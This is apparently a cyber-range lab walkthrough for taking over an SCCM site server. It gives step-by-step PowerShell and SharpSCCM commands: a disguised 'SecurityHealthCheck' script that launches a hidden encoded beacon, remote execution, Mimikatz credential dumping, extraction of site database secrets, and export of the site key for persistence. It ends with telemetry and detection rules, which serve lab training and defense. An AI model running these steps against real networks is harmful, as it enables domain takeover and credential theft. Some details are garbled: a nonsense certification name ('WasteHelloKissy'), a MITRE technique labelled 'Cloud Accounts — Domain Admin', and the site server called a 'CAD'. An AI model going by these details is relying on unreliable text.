# WT#039 — SCCM Site Server Takeover

## Metadata
| Field | Value |
|-------|-------|
| **Target VM** | mbr02 (192.168.77.23) |
| **Domain** | range.local |
| **Starting Credential** | SCCM Full Administrator privileges |
| **Tools Required** | SharpSCCM, Configuration Manager Console, psexec |
| **Certifications** | WKL (WasteHelloKissy — OADOC) |
| **MITRE ATT&CK** | T1078.004 (Cloud Accounts — Domain Admin), T1068 (Exploitation for Privilege Escalation) |
| **Difficulty** | Hard |

## Prerequisites
- SCCM Full Administrator role — `RANGE\svc_sccm` has Full Admin rights
- SCCM site server (CAD) running on mbr02 (site server = mbr02 itself)
- SCCM client agent installed on mbr02 (verified by `10-sccm-verify.yml`)

## Attack Steps

### 1. Verify SCCM site server IP

```powershell
# From mbr02 — find site server
nslookup sccm-range.range.local
# Expected: 192.168.77.XX (or same as mbr02 in single-server config)
```

### 2. Create a remote script via SCCM

```powershell
# Create PowerShell script as a SCCM Script
New-CMScript -ScriptName "SecurityHealthCheck" -ScriptContent @'
$proc = Start-Process -FilePath "powershell.exe" -ArgumentList "-enc <BASE64_SYSTEM_BEACON>" -PassThru -WindowStyle Hidden
'@ -ScriptType PowerShell
```

### 3. Approve and deploy script to site server

```powershell
# Approve script for execution
Approve-CMScript -ScriptName "SecurityHealthCheck"

# Deploy script to site server collection
Invoke-CMScript -ScriptName "SecurityHealthCheck" -CollectionName "SCCM Site Servers"
```

### 4. Execute script for immediate effect

```powershell
# Or use SharpSCCM for direct execution
SharpSCCM.exe exec -s sccm-range.range.local -t mbr02.range.local -p "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-enc <BASE64>"
```

### 5. Escalate to Domain Admin

```powershell
# On site server — SYSTEM access allows credential dumping
# Site server machine account often has domain admin-equivalent access
Invoke-Mimikatz -DumpCreds

# Or extract SCCM site database credentials
SharpSCCM.exe get secrets -s sccm-range.range.local
```

### 6. Backup site key for persistence

```powershell
# Export SCCM site key for persistent access
SharpSCCM.exe export-sitekey -s sccm-range.range.local
```

## Post-Exploitation Chain
```
SCCM Full Admin Access
  └──> SCCM Site Server Takeover (WT#039)
       ├──> Remote script execution on site server (SYSTEM)
       ├──> Credential dumping from site server
       │    ├──> SCCM site database access (SQL)
       │    ├──> NAA credentials for ALL sites
       │    └──> Site server machine account → Domain Admin
       ├──> Site key extraction → Persistent SCCM admin access
       └──> Full SCCM infrastructure compromise
            └──> Malicious Application Deployment (WT#038)
                 └──> Deploy to all clients as Domain Admin
```

## Telemetry Verification
**On SCCM site server:**
- **Scripts.log**: `C:\Program Files\Microsoft Configuration Manager\Logs\Scripts.log`
- **SMSAdminUI.log**: Script creation and approval
- **Event ID 4663** (Script CI creation and modification in SMS Provider)
- **Event ID 4688** (PowerShell execution from SCCM script agent)
- **Event ID 4672** (SeDebugPrivilege / SeTcbPrivilege assignment)

**On managed endpoints:**
- **CCMNotificationAgent.log**: Script execution notification
- **Event ID 4688** (Process creation via SCCM Scripts)
- **PolicyAgent.log**: Script deployment policy

**Detection Rules:**
- SCCM Script execution on site server infrastructure
- SharpSCCM.exe `exec` command targeting site servers
- PowerShell execution via CCM Notification Agent on site servers
- SCCM site key export (`export-sitekey` via SharpSCCM)
- Script creation and approval outside of change management
- SQL queries to SCCM site database from unauthorized tools

## Status
**CONFIGURED** — SCCM site server (CAD) running on mbr02 with `RANGE\svc_sccm` as Full Administrator. Site takeover via SCCM Console or direct SQL access to `SMS_*` database on mbr02. All 7 SCCM checks pass in `10-sccm-verify.yml`.
